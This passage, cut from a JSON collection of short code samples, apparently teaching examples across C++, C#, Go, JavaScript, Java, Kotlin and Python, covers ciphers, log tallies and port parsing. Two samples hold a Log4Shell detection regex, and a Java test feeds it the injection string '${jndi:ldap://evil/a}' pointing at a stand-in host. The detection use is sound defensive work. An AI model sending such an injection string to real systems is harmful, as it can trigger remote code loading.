443) {\n    return host + \":\" + std::to_string(port);\n}\n\nint demo() {\n    int threshold = 3;\n    auto noisy = [threshold](std::size_t words) { return words > static_cast<std::size_t>(threshold); };\n    return noisy(count_words(\"a b c d\")) ? 1 : 0;\n}\n","cpp5":"#include <string>\n#include <string_view>\n#include <cctype>\n\nstd::string caesar(std::string_view text, int shift) {\n    std::string out;\n    out.reserve(text.size());\n    int s = ((shift % 26) + 26) % 26;\n    for (char c : text) {\n        unsigned char u = static_cast<unsigned char>(c);\n        if (std::isalpha(u)) {\n            char base = std::isupper(u) ? 'A' : 'a';\n            out.push_back(static_cast<char>(base + (c - base + s) % 26));\n        } else {\n            out.push_back(c);\n        }\n    }\n    return out;\n}\n\nbool is_private(std::string_view ip) {\n    return ip.starts_with(\"10.\") || ip.starts_with(\"192.168.\");\n}\n","cpp6":"#include <string>\n#include <cstdio>\n\nclass Node {\npublic:\n    explicit Node(std::string name, int strength = 0) : name_(std::move(name)), strength_(strength) {}\n    int strength() const { return strength_; }\n    const std::string& name() const { return name_; }\n\nprivate:\n    std::string name_;\n    int strength_;\n};\n\nclass LogFile {\npublic:\n    explicit LogFile(const char* path) : f_(std::fopen(path, \"a\")) {}\n    ~LogFile() { if (f_) std::fclose(f_); }\n    LogFile(const LogFile&) = delete;\n    LogFile& operator=(const LogFile&) = delete;\n    void write(const char* line) { if (f_) std::fputs(line, f_); }\n\nprivate:\n    std::FILE* f_;\n};\n","cpp7":"#include <memory>\n#include <optional>\n#include <string>\n#include <string_view>\n#include <charconv>\n#include <vector>\n\nstruct Implant {\n    std::string id;\n};\n\nstd::optional<int> parse_port(std::string_view s) {\n    int value = 0;\n    auto [ptr, ec] = std::from_chars(s.data(), s.data() + s.size(), value);\n    if (ec != std::errc{} || ptr != s.data() + s.size() || value < 1 || value > 65535) {\n        return std::nullopt;\n    }\n    return value;\n}\n\nstd::vector<std::unique_ptr<Implant>> collect() {\n    std::vector<std::unique_ptr<Implant>> found;\n    std::unique_ptr<Implant> p = std::make_unique<Implant>(Implant{\"x-17\"});\n    found.push_back(std::move(p));\n    return found;\n}\n","cpp8":"#include <span>\n#include <optional>\n#include <vector>\n#include <cstddef>\n\nstd::optional<std::vector<std::byte>> heartbeat_reply(std::span<const std::byte> payload, std::size_t claimed) {\n    if (claimed > payload.size()) {\n        return std::nullopt;\n    }\n    auto echo = payload.first(claimed);\n    return std::vector<std::byte>(echo.begin(), echo.end());\n}\n","cpp9":"#include <concepts>\n#include <vector>\n#include <algorithm>\n\ntemplate <std::totally_ordered T>\nT strongest(const std::vector<T>& xs) {\n    return *std::max_element(xs.begin(), xs.end());\n}\n\ntemplate <typename T>\nclass Box {\npublic:\n    explicit Box(T v) : value_(v) {}\n    const T& get() const { return value_; }\n\nprivate:\n    T value_;\n};\n\nconstexpr int xp_for(int rank) { return 50 + 15 * rank; }\nstatic_assert(xp_for(2) == 80);\n","cs1":"static string Intro(string handle, int level) => $\"Agent {handle} // level {level}\";\n\nvar handle = \"neo\";\nConsole.WriteLine(Intro(handle, 3));\n","cs10":"static class Logs\n{\n    public static List<string> FailIps(IEnumerable<string> lines) =>\n        lines.Where(l => l.EndsWith(\"FAIL\"))\n             .Select(l => l.Split(' ')[0])\n             .ToList();\n\n    public static Dictionary<string, int> ByIp(IEnumerable<string> lines) =>\n        lines.Select(l => l.Split(' ')[0])\n             .GroupBy(ip => ip)\n             .ToDictionary(g => g.Key, g => g.Count());\n}\n","cs11":"static async Task<bool> PingAsync(string host, CancellationToken ct)\n{\n    await Task.Delay(50, ct);\n    return host.Length > 0;\n}\n\nstatic async Task<int> SweepAsync(IEnumerable<string> hosts, CancellationToken ct)\n{\n    var results = await Task.WhenAll(hosts.Select(h => PingAsync(h, ct)));\n    return results.Count(ok => ok);\n}\n\nusing var cts = new CancellationTokenSource(TimeSpan.FromSeconds(2));\nConsole.WriteLine(await SweepAsync([\"north\", \"harbor\", \"\"], cts.Token));\n","cs12":"using System;\nusing UnityEngine;\nusing Xunit;\n\npublic class SentryDrone : MonoBehaviour\n{\n    [SerializeField] private float speed = 2f;\n    [SerializeField] private float alertRange = 5f;\n    [SerializeField] private Transform target;\n\n    public event Action<float> TargetSpotted;\n\n    void Start()\n    {\n        Debug.Log(\"Sentry online\");\n    }\n\n    void Update()\n    {\n        transform.Rotate(0f, speed * 90f * Time.deltaTime, 0f);\n        if (target == null) return;\n        float d = Vector3.Distance(transform.position, target.position);\n        if (d < alertRange) TargetSpotted?.Invoke(d);\n    }\n\n    public static bool InRange(float distance, float range) => distance < range;\n}\n\npublic class SentryDroneTests\n{\n    [Fact]\n    public void DetectsTargetInsideRange()\n    {\n        Assert.Equal(true, SentryDrone.InRange(3f, 5f));\n    }\n}\n","cs2":"static string ThreatLevel(int score) => score switch\n{\n    >= 90 => \"CRITICAL\",\n    >= 60 => \"HIGH\",\n    >= 30 => \"MEDIUM\",\n    _ => \"LOW\",\n};\n\nforeach (var s in new[] { 95, 61, 12 })\n    Console.WriteLine($\"{s}: {ThreatLevel(s)}\");\n","cs3":"static Dictionary<string, int> Tally(List<string> ips)\n{\n    var counts = new Dictionary<string, int>();\n    foreach (var ip in ips)\n        counts[ip] = counts.GetValueOrDefault(ip) + 1;\n    return counts;\n}\n\nvar tally = Tally([\"10.0.0.4\", \"10.0.0.4\", \"8.8.8.8\"]);\nif (tally.TryGetValue(\"10.0.0.4\", out var hits))\n    Console.WriteLine($\"10.0.0.4 hit {hits} times\");\n","cs4":"static string Scan(string host, int port = 443) => $\"{host}:{port}\";\n\nstatic bool TryParsePort(string s, out int port) =>\n    int.TryParse(s, out port) && port is >= 1 and <= 65535;\n\nstatic (int Up, int Down) Count(bool[] results) =>\n    (results.Count(r => r), results.Count(r => !r));\n\nConsole.WriteLine(Scan(\"relay.example\", port: 8443));\n","cs5":"using System.Text;\n\nconst string Brief = \"\"\"\n    Operator,\n    decode the \"relay\" before dawn.\n    \"\"\";\n\nstatic string Caesar(string text, int shift)\n{\n    var sb = new StringBuilder(text.Length);\n    int s = ((shift % 26) + 26) % 26;\n    foreach (char c in text)\n    {\n        if (char.IsLetter(c) && c < 128)\n        {\n            char b = char.IsUpper(c) ? 'A' : 'a';\n            sb.Append((char)(b + (c - b + s) % 26));\n        }\n        else sb.Append(c);\n    }\n    return sb.ToString();\n}\n","cs6":"record Node(string Name, int Strength = 0)\n{\n    public bool IsHot => Strength > 80;\n}\n\nclass Session\n{\n    public int Requests { get; private set; }\n    public required string Id { get; init; }\n    public void Hit() => Requests++;\n}\n\nclass Demo\n{\n    static void Run()\n    {\n        var a = new Node(\"north\", 40);\n        var b = a with { Strength = 90 };\n        var s = new Session { Id = \"s-1\" };\n        Console.WriteLine($\"{b.IsHot} {s.Id}\");\n    }\n}\n","cs7":"class BadPortException(string input) : Exception($\"bad port: {input}\")\n{\n    public string Input { get; } = input;\n}\n\nstatic class Ports\n{\n    public static int ParsePort(string s)\n    {\n        if (!int.TryParse(s, out var p) || p is < 1 or > 65535)\n            throw new BadPortException(s);\n        return p;\n    }\n\n    public static int Load(string path, string? fallback)\n    {\n        using var reader = new StreamReader(path);\n        var raw = reader.ReadLine() ?? fallback ?? \"443\";\n        try\n        {\n            return ParsePort(raw);\n        }\n        catch (BadPortException e) when (e.Input.Length > 0)\n        {\n            Console.Error.WriteLine(e.Message);\n            return 443;\n        }\n        finally\n        {\n            Console.WriteLine(\"parse attempted\");\n        }\n    }\n}\n","cs8":"interface IDetector\n{\n    bool Detect(string line);\n}\n\nabstract class Rule : IDetector\n{\n    public abstract bool Detect(string line);\n    public virtual string Label => \"rule\";\n}\n\nsealed class Keyword(string word) : Rule\n{\n    public override bool Detect(string line) => line.Contains(word);\n    public override string Label => $\"keyword:{word}\";\n}\n","cs9":"class Box<T>(T value)\n{\n    public T Value { get; } = value;\n}\n\nstatic class Generics\n{\n    public static T Strongest<T>(IEnumerable<T> xs) where T : IComparable<T>\n    {\n        T best = default!;\n        bool first = true;\n        foreach (var x in xs)\n        {\n            if (first || x.CompareTo(best) > 0) { best = x; first = false; }\n        }\n        return best;\n    }\n\n    public static T Fresh<T>() where T : new() => new T();\n}\n","go1":"package main\n\nimport \"fmt\"\n\nfunc intro(handle string, level int) string {\n\treturn fmt.Sprintf(\"Agent %s // level %d\", handle, level)\n}\n\nfunc main() {\n\tfmt.Println(intro(\"neo\", 3))\n}\n","go10":"package main\n\nimport \"sync\"\n\nfunc ping(h string) bool { return len(h) > 0 }\n\nfunc sweep(hosts []string) int {\n\tvar wg sync.WaitGroup\n\tvar mu sync.Mutex\n\tup := 0\n\tfor _, h := range hosts {\n\t\twg.Add(1)\n\t\tgo func(host string) {\n\t\t\tdefer wg.Done()\n\t\t\tif ping(host) {\n\t\t\t\tmu.Lock()\n\t\t\t\tup++\n\t\t\t\tmu.Unlock()\n\t\t\t}\n\t\t}(h)\n\t}\n\twg.Wait()\n\treturn up\n}\n","go11":"package main\n\nimport \"context\"\n\nfunc ping(h string) string { return h }\n\nfunc firstReply(ctx context.Context, hosts []string) (string, error) {\n\treplies := make(chan string, len(hosts))\n\tfor _, h := range hosts {\n\t\tgo func(host string) { replies <- ping(host) }(h)\n\t}\n\tselect {\n\tcase r := <-replies:\n\t\treturn r, nil\n\tcase <-ctx.Done():\n\t\treturn \"\", ctx.Err()\n\t}\n}\n","go12":"package main\n\nimport (\n\t\"encoding/json\"\n\t\"net/http\"\n\t\"testing\"\n)\n\ntype Status struct {\n\tNode string `json:\"node\"`\n\tUp   bool   `json:\"up\"`\n}\n\nfunc threatLevel(score int) string {\n\tswitch {\n\tcase score >= 90:\n\t\treturn \"CRITICAL\"\n\tcase score >= 60:\n\t\treturn \"HIGH\"\n\tcase score >= 30:\n\t\treturn \"MEDIUM\"\n\t}\n\treturn \"LOW\"\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/status\", func(w http.ResponseWriter, r *http.Request) {\n\t\tw.Header().Set(\"Content-Type\", \"application/json\")\n\t\tjson.NewEncoder(w).Encode([]Status{{\"north\", true}, {\"harbor\", false}})\n\t})\n\thttp.ListenAndServe(\":8080\", nil)\n}\n\nfunc TestThreatLevel(t *testing.T) {\n\tcases := []struct {\n\t\tscore int\n\t\twant  string\n\t}{{95, \"CRITICAL\"}, {60, \"HIGH\"}, {30, \"MEDIUM\"}, {0, \"LOW\"}}\n\tfor _, c := range cases {\n\t\tif got := threatLevel(c.score); got != c.want {\n\t\t\tt.Errorf(\"threatLevel(%d) = %q, want %q\", c.score, got, c.want)\n\t\t}\n\t}\n}\n","go2":"package main\n\nfunc threatLevel(score int) string {\n\tswitch {\n\tcase score >= 90:\n\t\treturn \"CRITICAL\"\n\tcase score >= 60:\n\t\treturn \"HIGH\"\n\tcase score >= 30:\n\t\treturn \"MEDIUM\"\n\tdefault:\n\t\treturn \"LOW\"\n\t}\n}\n","go3":"package main\n\nimport \"sort\"\n\nfunc tally(ips []string) map[string]int {\n\tcounts := make(map[string]int)\n\tfor _, ip := range ips {\n\t\tcounts[ip]++\n\t}\n\treturn counts\n}\n\nfunc uniqueSorted(ips []string) []string {\n\tout := []string{}\n\tfor ip := range tally(ips) {\n\t\tout = append(out, ip)\n\t}\n\tsort.Strings(out)\n\treturn out\n}\n","go4":"package main\n\nfunc makeCounter(start int) func() int {\n\tn := start\n\treturn func() int {\n\t\tn++\n\t\treturn n\n\t}\n}\n\nfunc minMax(nums ...int) (min, max int) {\n\tif len(nums) == 0 {\n\t\treturn\n\t}\n\tmin, max = nums[0], nums[0]\n\tfor _, n := range nums {\n\t\tif n < min {\n\t\t\tmin = n\n\t\t}\n\t\tif n > max {\n\t\t\tmax = n\n\t\t}\n\t}\n\treturn\n}\n","go5":"package main\n\nimport \"strings\"\n\nfunc caesar(text string, shift int) string {\n\tvar b strings.Builder\n\ts := rune(((shift % 26) + 26) % 26)\n\tfor _, r := range text {\n\t\tswitch {\n\t\tcase r >= 'a' && r <= 'z':\n\t\t\tb.WriteRune('a' + (r-'a'+s)%26)\n\t\tcase r >= 'A' && r <= 'Z':\n\t\t\tb.WriteRune('A' + (r-'A'+s)%26)\n\t\tdefault:\n\t\t\tb.WriteRune(r)\n\t\t}\n\t}\n\treturn b.String()\n}\n","go6":"package main\n\nimport \"fmt\"\n\ntype Node struct {\n\tName     string\n\tStrength int\n}\n\nfunc (n *Node) Boost(by int) int {\n\tn.Strength += by\n\treturn n.Strength\n}\n\nfunc (n Node) Label() string {\n\treturn fmt.Sprintf(\"%s(%d)\", n.Name, n.Strength)\n}\n\ntype Relay struct {\n\tNode\n\tHops int\n}\n","go7":"package main\n\nimport (\n\t\"errors\"\n\t\"fmt\"\n)\n\nvar ErrDenied = errors.New(\"access denied\")\n\nfunc unlock(code string) (string, error) {\n\tif code == \"0451\" {\n\t\treturn \"OPEN\", nil\n\t}\n\treturn \"\", fmt.Errorf(\"unlock %q: %w\", code, ErrDenied)\n}\n\nfunc safeUnlock(code string) string {\n\tres, err := unlock(code)\n\tif errors.Is(err, ErrDenied) {\n\t\treturn \"DENIED\"\n\t}\n\treturn res\n}\n","go8":"package main\n\nimport \"strings\"\n\ntype Detector interface {\n\tDetect(line string) bool\n}\n\ntype Keyword struct {\n\tWord string\n}\n\nfunc (k Keyword) Detect(line string) bool {\n\treturn strings.Contains(line, k.Word)\n}\n\nfunc countHits(d Detector, lines []string) int {\n\tn := 0\n\tfor _, l := range lines {\n\t\tif d.Detect(l) {\n\t\t\tn++\n\t\t}\n\t}\n\treturn n\n}\n","go9":"package main\n\ntype Number interface {\n\t~int | ~float64\n}\n\nfunc Filter[T any](xs []T, keep func(T) bool) []T {\n\tvar out []T\n\tfor _, x := range xs {\n\t\tif keep(x) {\n\t\t\tout = append(out, x)\n\t\t}\n\t}\n\treturn out\n}\n\nfunc Sum[N Number](xs []N) N {\n\tvar total N\n\tfor _, x := range xs {\n\t\ttotal += x\n\t}\n\treturn total\n}\n","js1":"function intro(handle, level) {\n  return `Agent ${handle} // level ${level}`;\n}\n","js10":"async function sweep(hosts, ping) {\n  const results = await Promise.allSettled(hosts.map(h => ping(h)));\n  const up = [], down = [];\n  results.forEach((r, i) => (r.status === \"fulfilled\" ? up : down).push(hosts[i]));\n  return { up, down };\n}\n","js11":"function deepEqual(a, b) {\n  if (a === b) return true;\n  if (a === null || b === null || typeof a !== \"object\" || typeof b !== \"object\") return false;\n  if (Array.isArray(a) !== Array.isArray(b)) return false;\n  const ka = Object.keys(a), kb = Object.keys(b);\n  if (ka.length !== kb.length) return false;\n  return ka.every(k => Object.hasOwn(b, k) && deepEqual(a[k], b[k]));\n}\n","js12":"const validIp = ip => /^(\\d{1,3})(\\.\\d{1,3}){3}$/.test(ip) && ip.split(\".\").every(p => +p <= 255 && String(+p) === p);\n\nasync function analyze(source) {\n  const lines = await source();\n  const fails = new Map();\n  let total = 0, skipped = 0, failCount = 0;\n  for (const line of lines) {\n    const parts = line.trim().split(/\\s+/);\n    if (parts.length !== 2 || !validIp(parts[0])) { skipped++; continue; }\n    total++;\n    if (parts[1] === \"FAIL\") { failCount++; fails.set(parts[0], (fails.get(parts[0]) ?? 0) + 1); }\n  }\n  let topIp = null, best = 0;\n  for (const [ip, n] of fails) if (n > best) { best = n; topIp = ip; }\n  return { total, fails: failCount, topIp, skipped };\n}\n","js2":"function threatLevel(score) {\n  if (score >= 90) return \"CRITICAL\";\n  if (score >= 60) return \"HIGH\";\n  if (score >= 30) return \"MEDIUM\";\n  return \"LOW\";\n}\n","js3":"function exposed(hosts) {\n  return hosts.filter(h => !h.patched).map(h => h.name).sort();\n}\n","js4":"function makeCounter(start = 0) {\n  let count = start;\n  return () => ++count;\n}\n","js5":"function isMalicious(input) {\n  return /\\$\\{\\s*jndi:/i.test(input);\n}\n","js6":"class Node {\n  constructor(name) { this.name = name; this.strength = 0; }\n  boost(n) { this.strength += n; return this.strength; }\n  get label() { return `${this.name}(${this.strength})`; }\n}\nclass Relay extends Node {\n  boost(n) { return super.boost(n * 2); }\n}\n","js7":"class AccessDenied extends Error {\n  constructor(msg) { super(msg); this.name = \"AccessDenied\"; }\n}\nfunction unlock(code) {\n  if (code === \"0451\") return \"OPEN\";\n  throw new AccessDenied(`bad code ${code}`);\n}\nfunction safeUnlock(code) {\n  try { return unlock(code); }\n  catch (e) { if (e instanceof AccessDenied) return \"DENIED\"; throw e; }\n}\n","js8":"function tally(items) {\n  const m = new Map();\n  for (const x of items) m.set(x, (m.get(x) ?? 0) + 1);\n  return Object.fromEntries(m);\n}\nfunction topN(items, n) {\n  return Object.entries(tally(items)).sort((a, b) => b[1] - a[1]).slice(0, n);\n}\n","js9":"function* chunks(arr, size) {\n  for (let i = 0; i < arr.length; i += size) yield arr.slice(i, i + size);\n}\nfunction* take(iter, n) {\n  if (n <= 0) return;\n  let i = 0;\n  for (const v of iter) { yield v; if (++i >= n) return; }\n}\n","jv1":"public class Intro {\n    static String intro(String handle, int level) {\n        return \"Agent \" + handle + \" // level \" + level;\n    }\n\n    public static void main(String[] args) {\n        var handle = \"neo\";\n        System.out.printf(\"%s%n\", intro(handle, 3));\n    }\n}\n","jv10":"import java.util.*;\nimport java.util.stream.*;\n\npublic class Streams {\n    static List<String> failIps(List<String> lines) {\n        return lines.stream()\n            .filter(l -> l.endsWith(\"FAIL\"))\n            .map(l -> l.split(\"\\\\s+\")[0])\n            .collect(Collectors.toList());\n    }\n\n    static Map<String, Long> byIp(List<String> lines) {\n        return lines.stream()\n            .map(l -> l.split(\"\\\\s+\")[0])\n            .collect(Collectors.groupingBy(ip -> ip, Collectors.counting()));\n    }\n}\n","jv11":"import java.util.*;\nimport java.util.concurrent.*;\nimport java.util.concurrent.atomic.*;\n\npublic class Sweep {\n    static boolean ping(String h) { return !h.isEmpty(); }\n\n    static int sweep(List<String> hosts) {\n        AtomicInteger up = new AtomicInteger();\n        try (var executor = Executors.newVirtualThreadPerTaskExecutor()) {\n            for (String h : hosts) {\n                executor.submit(() -> { if (ping(h)) up.incrementAndGet(); });\n            }\n        }\n        return up.get();\n    }\n\n    static String report(List<String> hosts) {\n        return CompletableFuture.supplyAsync(() -> sweep(hosts))\n            .thenApply(n -> n + \"/\" + hosts.size() + \" up\")\n            .join();\n    }\n}\n","jv12":"import java.util.regex.*;\nimport static org.junit.jupiter.api.Assertions.*;\nimport org.junit.jupiter.api.Test;\n\nsealed interface Event permits Login, Breach, Logout {}\nrecord Login(String user) implements Event {}\nrecord Breach(int severity) implements Event {}\nrecord Logout(String user) implements Event {}\n\nclass Triage {\n    private static final Pattern JNDI = Pattern.compile(\"\\\\$\\\\{\\\\s*jndi:\", Pattern.CASE_INSENSITIVE);\n\n    static String describe(Event e) {\n        return switch (e) {\n            case Login l -> l.user() + \" in\";\n            case Breach b when b.severity() >= 8 -> \"CRITICAL breach\";\n            case Breach b -> \"breach \" + b.severity();\n            case Logout o -> o.user() + \" out\";\n        };\n    }\n\n    static String sanitize(String input) {\n        return JNDI.matcher(input).find() ? \"[BLOCKED]\" : input;\n    }\n}\n\nclass TriageTest {\n    @Test\n    void describesCriticalBreach() {\n        assertEquals(\"CRITICAL breach\", Triage.describe(new Breach(9)));\n    }\n\n    @Test\n    void blocksLog4Shell() {\n        assertEquals(\"[BLOCKED]\", Triage.sanitize(\"${jndi:ldap://evil/a}\"));\n    }\n}\n","jv2":"public class Triage {\n    static String threatLevel(int score) {\n        if (score >= 90) return \"CRITICAL\";\n        else if (score >= 60) return \"HIGH\";\n        else if (score >= 30) return \"MEDIUM\";\n        else return \"LOW\";\n    }\n\n    static int portFor(String service) {\n        return switch (service) {\n            case \"ssh\" -> 22;\n            case \"http\" -> 80;\n            case \"https\", \"tls\" -> 443;\n            default -> -1;\n        };\n    }\n}\n","jv3":"import java.util.*;\n\npublic class Tally {\n    static Map<String, Integer> tally(List<String> ips) {\n        Map<String, Integer> counts = new HashMap<>();\n        for (String ip : ips) {\n            counts.merge(ip, 1, Integer::sum);\n        }\n        return counts;\n    }\n}\n","jv4":"public class Scanner {\n    static String scan(String host) {\n        return scan(host, 443);\n    }\n\n    static String scan(String host, int port) {\n        return host + \":\" + port;\n    }\n\n    static int sum(int... xs) {\n        int total = 0;\n        for (int x : xs) total += x;\n        return total;\n    }\n}\n","jv5":"public class Cipher {\n    static final String BRIEF = \"\"\"\n        Operator,\n        decode the relay before dawn.\n        \"\"\";\n\n    static String caesar(String text, int shift) {\n        StringBuilder sb = new StringBuilder();\n        int s = ((shift % 26) + 26) % 26;\n        for (char c : text.toCharArray()) {\n            if (Character.isUpperCase(c)) sb.append((char) ('A' + (c - 'A' + s) % 26));\n            else if (Character.isLowerCase(c)) sb.append((char) ('a' + (c - 'a' + s) % 26));\n            else sb.append(c);\n        }\n        return sb.toString();\n    }\n}\n","jv6":"record Node(String name, int strength) {\n    public Node {\n        if (name == null || name.isBlank()) throw new IllegalArgumentException(\"name required\");\n        if (strength < 0) throw new IllegalArgumentException(\"strength must be >= 0\");\n    }\n}\n\nclass Session {\n    private final String id;\n\n    Session(String id) {\n        this.id = id;\n    }\n\n    String id() { return id; }\n}\n\nenum Faction { LOGOS, SENTINEL, MERIDIAN }\n","jv7":"import java.io.*;\nimport java.nio.file.*;\n\nclass BadPortException extends Exception {\n    BadPortException(String msg, Throwable cause) { super(msg, cause); }\n}\n\npublic class Ports {\n    static int parsePort(String s) throws BadPortException {\n        try {\n            int p = Integer.parseInt(s);\n            if (p < 1 || p > 65535) throw new BadPortException(\"out of range: \" + p, null);\n            return p;\n        } catch (NumberFormatException e) {\n            throw new BadPortException(\"not a number: \" + s, e);\n        }\n    }\n\n    static long countLines(Path file) throws IOException {\n        try (BufferedReader reader = Files.newBufferedReader(file)) {\n            return reader.lines().count();\n        }\n    }\n}\n","jv8":"import java.util.*;\n\ninterface Detector {\n    boolean detect(String line);\n\n    default long count(List<String> lines) {\n        return lines.stream().filter(this::detect).count();\n    }\n}\n\nabstract class Rule implements Detector {\n    abstract String name();\n}\n\nclass Keyword extends Rule {\n    private final String word;\n\n    Keyword(String word) { this.word = word; }\n\n    @Override\n    public boolean detect(String line) { return line.contains(word); }\n\n    @Override\n    String name() { return \"keyword:\" + word; }\n}\n","jv9":"import java.util.*;\n\nclass Box<T> {\n    private final T value;\n    Box(T value) { this.value = value; }\n    T get() { return value; }\n}\n\nclass Generics {\n    static <T extends Comparable<T>> T strongest(List<T> xs) {\n        T best = null;\n        for (T x : xs) if (best == null || x.compareTo(best) > 0) best = x;\n        return best;\n    }\n\n    static double total(List<? extends Number> xs) {\n        double sum = 0;\n        for (Number n : xs) sum += n.doubleValue();\n        return sum;\n    }\n}\n","kt1":"fun intro(handle: String, level: Int): String = \"Agent $handle // level $level\"\n\nfun main() {\n    val handle = \"neo\"\n    var runs = 0\n    runs += 1\n    println(\"${intro(handle, 3)} (run $runs)\")\n}\n","kt10":"import kotlinx.coroutines.*\n\nsuspend fun ping(host: String): Boolean {\n    delay(50)\n    return host.isNotEmpty()\n}\n\nsuspend fun sweep(hosts: List<String>): Int = coroutineScope {\n    hosts.map { h -> async { ping(h) } }.awaitAll().count { it }\n}\n\nfun main() = runBlocking {\n    launch { println(\"heartbeat\") }\n    println(\"up: ${sweep(listOf(\"a\", \"b\", \"\"))}\")\n}\n","kt11":"import kotlin.test.*\n\nfun parsePort(s: String): Int {\n    val p = s.toIntOrNull() ?: throw IllegalArgumentException(\"bad port\")\n    require(p in 1..65535)\n    return p\n}\n\nclass PortParserTest {\n    @Test\n    fun parsesValidPort() {\n        assertEquals(443, parsePort(\"443\"))\n    }\n\n    @Test\n    fun rejectsGarbage() {\n        assertFailsWith<IllegalArgumentException> { parsePort(\"abc\") }\n    }\n}\n","kt12":"import androidx.compose.foundation.lazy.LazyColumn\nimport androidx.compose.foundation.lazy.items\nimport androidx.compose.material3.Button\nimport androidx.compose.material3.Text\nimport androidx.compose.runtime.*\nimport androidx.lifecycle.ViewModel\nimport androidx.lifecycle.viewModelScope\nimport kotlinx.coroutines.delay\nimport kotlinx.coroutines.flow.MutableStateFlow\nimport kotlinx.coroutines.flow.StateFlow\nimport kotlinx.coroutines.launch\n\nsealed interface UiState {\n    data object Loading : UiState\n    data class Ready(val alerts: List<String>) : UiState\n}\n\nclass ConsoleViewModel : ViewModel() {\n    private val _state = MutableStateFlow<UiState>(UiState.Loading)\n    val state: StateFlow<UiState> = _state\n\n    fun refresh() {\n        viewModelScope.launch {\n            _state.value = UiState.Loading\n            delay(200)\n            _state.value = UiState.Ready(listOf(\"north up\", \"harbor down\"))\n        }\n    }\n}\n\n@Composable\nfun ConsoleScreen(vm: ConsoleViewModel) {\n    val state by vm.state.collectAsState()\n    var taps by remember { mutableStateOf(0) }\n    Button(onClick = { taps++; vm.refresh() }) { Text(\"Refresh ($taps)\") }\n    when (val s = state) {\n        UiState.Loading -> Text(\"loading...\")\n        is UiState.Ready -> LazyColumn {\n            items(s.alerts) { alert -> Text(alert) }\n        }\n    }\n}\n","kt2":"fun threatLevel(score: Int): String = when (score) {\n    in 90..100 -> \"CRITICAL\"\n    in 60..89 -> \"HIGH\"\n    in 30..59 -> \"MEDIUM\"\n    else -> \"LOW\"\n}\n\nfun countdown() {\n    for (i in 10 downTo 0 step 2) println(\"T-$i\")\n}\n","kt3":"fun tally(ips: List<String>): Map<String, Int> = ips.groupingBy { it }.eachCount()\n\nval ports = mapOf(\"ssh\" to 22, \"https\" to 443, \"dns\" to 53)\n","kt4":"fun scan(host: String, port: Int = 443): String = \"$host:$port\"\n\nfun String.isPrivateIp(): Boolean =\n    startsWith(\"10.\") || startsWith(\"192.168.\") || startsWith(\"172.16.\")\n\nfun repeatScan(times: Int, action: (Int) -> Unit) {\n    for (i in 1..times) action(i)\n}\n\nfun main() {\n    println(scan(\"relay.example\", port = 8443))\n    println(\"10.0.0.4\".isPrivateIp())\n    repeatScan(3) { attempt -> println(\"attempt $attempt\") }\n}\n","kt5":"fun lookup(name: String, db: Map<String, String>): String = db[name] ?: \"unknown\"\n\nfun parseKv(s: String): Map<String, String> =\n    s.split(\";\")\n        .filter { \"=\" in it }\n        .associate {\n            val (k, v) = it.split(\"=\", limit = 2)\n            k.trim() to v.trim()\n        }\n","kt6":"data class Node(val name: String, val strength: Int = 0)\n\nobject Registry {\n    val nodes = mutableListOf<Node>()\n}\n\nclass Session private constructor(val id: String) {\n    companion object {\n        fun create(): Session = Session(\"s-\" + System.nanoTime())\n    }\n}\n\nfun main() {\n    val a = Node(\"north\", 40)\n    val b = a.copy(strength = 90)\n    val (name, strength) = b\n    Registry.nodes += b\n    println(\"$name $strength ${Session.create().id}\")\n}\n","kt7":"class BadPort(val input: String) : Exception(\"bad port: $input\")\n\nfun parsePort(s: String): Int {\n    val p = s.toIntOrNull() ?: throw BadPort(s)\n    require(p in 1..65535) { \"port out of range: $p\" }\n    return p\n}\n\nfun main() {\n    val first = try {\n        parsePort(\"443\")\n    } catch (e: BadPort) {\n        -1\n    }\n    val second = runCatching { parsePort(\"abc\") }.getOrDefault(-1)\n    println(\"$first $second\")\n}\n","kt8":"sealed interface Event\ndata class Login(val user: String) : Event\ndata class Breach(val severity: Int) : Event\ndata object Logout : Event\n\nfun describe(e: Event): String = when (e) {\n    is Login -> \"${e.user} in\"\n    is Breach -> \"BREACH sev ${e.severity}\"\n    Logout -> \"logout\"\n}\n\nenum class Faction(val color: String) {\n    LOGOS(\"#c79bff\"), SENTINEL(\"#5ad1ff\"), MERIDIAN(\"#7dff9a\")\n}\n","kt9":"interface Detector {\n    fun detect(line: String): Boolean\n}\n\nopen class Rule(val name: String) {\n    open fun label(): String = \"rule:$name\"\n}\n\nclass Keyword(private val word: String) : Rule(\"keyword\"), Detector {\n    override fun detect(line: String): Boolean = word in line\n    override fun label(): String = \"keyword:$word\"\n}\n\nfun <T : Comparable<T>> strongest(xs: List<T>): T? = xs.maxOrNull()\n","py1":"def intro(handle, level):\n    return f\"Agent {handle} // level {level}\"\n","py10":"import asyncio\n\nasync def ping(host):\n    await asyncio.sleep(0)\n    return f\"{host}:ok\"\n\nasync def sweep(hosts):\n    return list(await asyncio.gather(*(ping(h) for h in hosts)))\n","py11":"def is_valid_ip(s: str) -> bool:\n    parts = s.split(\".\")\n    if len(parts) != 4:\n        return False\n    for p in parts:\n        if not p.isdigit() or (len(p) > 1 and p[0] == \"0\") or int(p) > 255:\n            return False\n    return True\n","py12":"from collections import Counter\nfrom dataclasses import dataclass\n\ndef is_valid_ip(s: str) -> bool:\n    parts = s.split(\".\")\n    return len(parts) == 4 and all(p.isdigit() and str(int(p)) == p and 0 <= int(p) <= 255 for p in parts)\n\n@dataclass\nclass Summary:\n    total: int\n    fails: int\n    top_ip: str | None\n\ndef analyze(lines) -> Summary:\n    total = 0\n    fail_counts = Counter()\n    for line in lines:\n        parts = line.split()\n        if len(parts) != 2 or not is_valid_ip(parts[0]):\n            continue\n        total += 1\n        if parts[1] == \"FAIL\":\n            fail_counts[parts[0]] += 1\n    top = fail_counts.most_common(1)\n    return Summary(total, sum(fail_counts.values()), top[0][0] if top else None)\n","py2":"def threat_level(score):\n    if score >= 90:\n        return \"CRITICAL\"\n    elif score >= 60:\n        return \"HIGH\"\n    elif score >= 30:\n        return \"MEDIUM\"\n    return \"LOW\"\n","py3":"def unique_fail_ips(logs):\n    return sorted({line.split()[0] for line in logs if line.split()[1:] == [\"FAIL\"]})\n","py4":"def make_counter(start=0):\n    count = start\n    def tick():\n        nonlocal count\n        count += 1\n        return count\n    return tick\n","py5":"def caesar(text, shift):\n    out = []\n    for ch in text:\n        if ch.isalpha():\n            base = ord(\"A\") if ch.isupper() else ord(\"a\")\n            out.append(chr((ord(ch) - base + shift) % 26 + base))\n        else:\n            out.append(ch)\n    return \"\".join(out)\n","py6":"from dataclasses import 